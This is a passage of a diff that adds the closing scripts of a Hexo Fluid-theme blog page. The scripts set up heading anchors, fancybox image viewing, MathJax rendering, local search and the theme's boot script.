+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
